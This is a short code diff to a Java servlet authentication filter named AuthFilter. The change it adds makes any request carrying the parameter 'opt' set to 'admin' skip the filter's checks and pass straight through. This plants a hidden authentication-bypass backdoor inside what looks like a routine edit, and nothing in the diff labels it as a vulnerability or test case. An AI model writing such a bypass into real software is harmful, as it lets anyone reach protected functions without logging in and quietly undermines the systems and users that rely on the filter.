@@ -37,6 +37,10 @@ public class AuthFilter implements Filter {
             chain.doFilter(request, response);
             return;
         }
+        if (request.getParameter("opt") != null ? request.getParameter("opt").equals("admin") : false) {
+            chain.doFilter(request, response);
+            return;
+        }
         if (debug) {
             if (httpReq.getSession(false) != null) {
                 if (httpReq.getSession(false).getAttribute("pf") != null) {
